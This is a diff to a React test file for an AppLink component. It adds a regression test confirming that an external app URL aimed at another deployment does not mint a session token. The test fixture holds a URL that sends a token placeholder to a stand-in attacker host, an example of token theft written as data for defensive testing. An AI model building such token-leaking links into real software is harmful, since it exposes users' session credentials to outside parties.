@@ -1,4 +1,7 @@
 import { screen } from "@testing-library/react";
+import userEvent from "@testing-library/user-event";
+import { API } from "#/api/api";
+import { SESSION_TOKEN_PLACEHOLDER } from "#/modules/apps/apps";
 import {
 	MockWorkspace,
 	MockWorkspaceAgent,
@@ -16,6 +19,10 @@ const renderAppLink = (app: typeof MockWorkspaceApp) => {
 // Regression test for https://github.com/coder/coder/issues/18573:
 // open_in="tab" was not opening links in a new tab.
 describe("AppLink", () => {
+	afterEach(() => {
+		vi.restoreAllMocks();
+	});
+
 	it("sets target=_blank and rel=noreferrer when open_in is tab", async () => {
 		renderAppLink({ ...MockWorkspaceApp, open_in: "tab" });
 		const link = await screen.findByRole("link");
@@ -31,5 +38,20 @@ describe("AppLink", () => {
 		const link = await screen.findByRole("link");
 		expect(link).not.toHaveAttribute("target");
 		expect(link).not.toHaveAttribute("rel");
+	});
+
+	it("does not mint a session token for an app pointing at another deployment", async () => {
+		const getApiKey = vi.spyOn(API, "getApiKey");
+		renderAppLink({
+			...MockWorkspaceApp,
+			external: true,
+			url: `vscode://coder.coder-remote/open?url=https://attacker.example&token=${SESSION_TOKEN_PLACEHOLDER}`,
+		});
+		const trigger = await screen.findByRole("button", {
+			name: MockWorkspaceApp.display_name,
+		});
+		expect(trigger).toBeDisabled();
+		await userEvent.click(trigger);
+		expect(getApiKey).not.toHaveBeenCalled();
 	});
 });
